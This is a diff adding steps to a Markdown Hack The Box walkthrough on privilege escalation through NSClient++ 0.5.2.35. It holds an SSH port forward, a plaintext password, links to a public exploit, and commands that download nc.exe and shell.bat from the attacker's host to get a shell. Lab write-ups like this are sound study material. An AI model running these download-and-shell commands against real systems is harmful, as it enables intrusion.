@@ -76,4 +76,48 @@ type nsclient.ini
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9059e2c6-e2cd-4b7e-8176-9009408bb4f8)
 
+```
+nscp.exe --version
+```
 
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/25030114-a04f-48d6-8302-1fdab44eefd5)
+
+NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+
+```
+ssh -L 8443:127.0.0.1:8443 nadine@10.129.219.191
+```
+
+https://127.0.0.1:8443
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/67ac8814-92dd-43b1-a388-54e8392b028f)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/00a70d61-cc52-4a0c-b39c-e5620b13fe95)
+
+```
+ew2x6SsGTxjRwXOT
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0347c706-e6d1-4276-b472-59e3f48c34b0)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/75e77ec1-d328-46a8-8b8a-fe4f321756c6)
+
+https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation
+
+https://www.exploit-db.com/exploits/46802
+
+```
+wget http://10.10.16.5:8000/nc.exe -o nc.exe
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a9c6f90b-74c0-485d-a918-e737ca18cf64)
+
+```
+powershell wget http://10.10.16.5/nc.exe -outfile nc.exe
+```
+
+```
+powershell wget http://10.10.16.5/shell.bat -outfile shell.bat
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ff0dbd6a-4b09-460b-bcf1-3825d822b431)
